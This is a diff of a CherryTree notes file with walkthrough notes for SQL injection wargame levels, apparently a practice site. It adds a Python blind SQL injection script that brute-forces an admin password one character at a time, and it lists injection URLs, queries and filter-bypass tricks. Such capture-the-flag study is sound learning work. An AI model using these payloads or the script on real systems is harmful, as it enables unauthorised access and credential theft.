@@ -29,10 +29,31 @@ URL: ?no=0 or id=0x61646d696e
 QUERY: select id from prob_goblin where id='guest' and no=0 or id=0x61646d696e
 </rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="4. Orc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1595682469.82" ts_lastsave="1596902666.15" unique_id="7">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="4. Orc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1595682469.82" ts_lastsave="1596287227.4" unique_id="7">
 			<rich_text>Using the ‘or’ operator and SUBSTR method Blind-SQLI can be executed to gain info:
 The passwords length is 8 characters.
-Script attached
+Then a short script was use, the code is pasted below.
+
+#!/bin/python3
+import sys
+import requests
+import itertools as it
+
+
+def isCorrect(pw):
+	r = requests.get(sys.argv[1],
+					 params={&quot;pw&quot; : pw},
+					 cookies={&quot;PHPSESSID&quot; : &quot;{sys.argv[2]}&quot;})
+	return &quot;&lt;h2&gt;&quot; in r.content.decode(&quot;UTF-8&quot;)
+
+
+for position in range(1, 9):
+	for letter in it.chain(range(ord('0'), ord('9') + 1), range(ord('a'), ord('z') + 1)):
+		if(isCorrect(&quot;' or id = 'admin' and SUBSTR(pw, {}, 1) = '{}&quot;.format(position, chr(letter)))):
+			print(chr(letter))
+			break;
+
+---
 
 URL: 095a9852
 
@@ -55,13 +76,13 @@ QUERY: select id from prob_darkelf where id='guest' and pw='' || id='admin'
 Introducing || to mark OR
 </rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="7. Orge" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1596287931.43" ts_lastsave="1596902688.85" unique_id="10">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="7. Orge" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1596287931.43" ts_lastsave="1596288222.57" unique_id="10">
 			<rich_text>URL: ?pw=7b751aec
 
 QUERY: select id from prob_orge where id='guest' and pw='7b751aec'
 
 Solvable using the script from orc, after modifying OR, AND
-Script attached</rich_text>
+</rich_text>
 		</node>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="8. Troll" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1596288273.99" ts_lastsave="1596288527.64" unique_id="11">
 			<rich_text>URL: ?id=admIn
@@ -89,7 +110,7 @@ QUERY: select id from prob_skeleton where id='guest' and pw=''or id='admin' or '
 
 </rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="11. Golem" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1596289109.33" ts_lastsave="1596902698.08" unique_id="14">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="11. Golem" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1596289109.33" ts_lastsave="1596294370.39" unique_id="14">
 			<rich_text>URL: ?pw=77d6290b
 
 QUERY: select id from prob_golem where id='guest' and pw='77d6290b'
@@ -102,10 +123,9 @@ Losers say:
 winners say:
 - replace = with LIKE
 - replace SUBSTR with MID 
-
-Script attached</rich_text>
+</rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="12. Dark Knight" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1596294370.39" ts_lastsave="1596902708.71" unique_id="15">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="12. Dark Knight" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1596294370.39" ts_lastsave="1596294443.93" unique_id="15">
 			<rich_text>URL: ?pw=0b70ea1f
 
 QUERY: select id from prob_darkknight where id='guest' and pw='0b70ea1f' and no=
@@ -113,8 +133,7 @@ QUERY: select id from prob_darkknight where id='guest' and pw='0b70ea1f' and no=
 Another Blind SQLi
 - “no” inject parameter like in Goblin
 - replace ' with &quot;
-
-Script attached</rich_text>
+</rich_text>
 		</node>
 	</node>
 </cherrytree>
